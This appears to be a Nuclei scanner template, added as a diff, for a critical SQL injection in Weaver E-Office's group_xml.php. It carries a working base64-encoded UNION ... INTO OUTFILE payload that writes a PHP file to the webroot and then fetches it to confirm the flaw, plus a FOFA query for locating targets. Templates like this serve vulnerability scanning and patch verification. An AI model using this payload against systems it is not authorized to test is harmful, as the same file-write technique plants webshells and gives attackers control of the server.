@@ -1,0 +1,46 @@
+id: weaver-group-xml-sqli
+
+info:
+  name: OA E-Office group_xml.php - SQL Injection
+  author: SleepingBag945
+  severity: critical
+  description: |
+    There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php file. Through the vulnerability, an attacker can write to the Webshell file to obtain server permissions.
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/泛微OA/泛微OA%20E-Office%20group_xml.php%20SQL注入漏洞.html
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20group_xml.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: weaver
+    product: e-office
+    fofa-query: app="泛微-EOffice"
+  tags: weaver,e-office,oa,sqli
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  string: "weaver-group-xml-sqli"
+  payload: "[group]:[1]|[groupid]:[1 union select '<?php echo md5(\"{{string}}\");unlink(__FILE__);?>',2,3,4,5,6,7,8 into outfile '../webroot/{{filename}}.php']"
+
+http:
+  - raw:
+      - |
+        GET /inc/group_user_list/group_xml.php?par={{base64(payload)}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+      - |
+        GET /{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+
+      - type: status
+        status:
+          - 200
+# digest: 490a004630440220332b87f33ce2b883747e1f5b91b16018b5e1f6789963f8d1992759f94cb1163e02206a511eccb67c671d18844b52555cba784b385906272e71d0217d7cac6fca5ecd:922c64590222798bb761d5b6d8e72950
